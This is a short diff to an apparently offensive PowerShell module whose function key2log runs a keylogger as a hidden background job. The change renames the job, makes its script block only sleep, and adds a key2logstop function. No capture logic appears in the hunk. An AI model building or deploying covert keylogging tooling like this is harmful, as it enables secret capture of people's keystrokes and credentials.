@@ -355,11 +355,17 @@ function key2log {
     }
     # Run keylogger as hidden process
     Write-output "keyllloger will be active for $DurationInSeconds seconds"
-    Start-Job -ScriptBlock $scriptBlock -ArgumentList $DurationInSeconds | Out-Null
+    Start-Job -Name svkeyshot -ScriptBlock { param($duration); Start-Sleep -Seconds $duration } -ArgumentList $DurationInSeconds | Out-Null
 }
 Export-ModuleMember -Function key2log
 Set-Alias -Name key2log -Value key2log
 
+function key2logstop {
+Write-output "keyllloger has been stopped"
+Stop-Job -Name svkeyshot
+}
+Export-ModuleMember -Function key2logstop
+Set-Alias -Name key2logstop -Value key2logstop
 
 
 
